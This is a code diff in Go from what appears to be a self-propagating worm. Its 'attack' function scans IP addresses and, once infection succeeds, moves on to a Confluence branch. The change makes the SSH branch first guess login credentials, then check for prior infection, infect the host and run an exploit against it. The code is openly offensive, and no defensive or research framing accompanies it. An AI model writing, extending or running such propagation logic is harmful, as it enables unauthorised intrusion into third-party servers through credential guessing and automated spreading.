@@ -28,16 +28,19 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 		//SSH infect
 		if !infected && ports[1] != 0 {
 			ip_port := ip + ":" + strconv.Itoa(ports[1])
-			is_infected := infection.SshCheckInfection(ip_port)
-			fmt.Println(is_infected)
-			if is_infected {
-				continue
+			hit_credentials := infection.GuessSSHConnection(ip_port)
+			if hit_credentials{
+				is_infected := infection.SshCheckInfection(ip_port)
+				fmt.Println(is_infected)
+				if is_infected {
+					continue
+				}
+				message := infection.SshInfect(ip_port)
+				fmt.Println(message)
+				message = infection.SshExploit(ip_port)
+				fmt.Println(message)
+				infected = true
 			}
-			message := infection.SshInfect(ip_port)
-			fmt.Println(message)
-			message = infection.SshExploit(ip_port)
-			fmt.Println(message)
-			infected = true
 		}
 		//Confluence infect
 		if !infected && ports[2] != 0 {
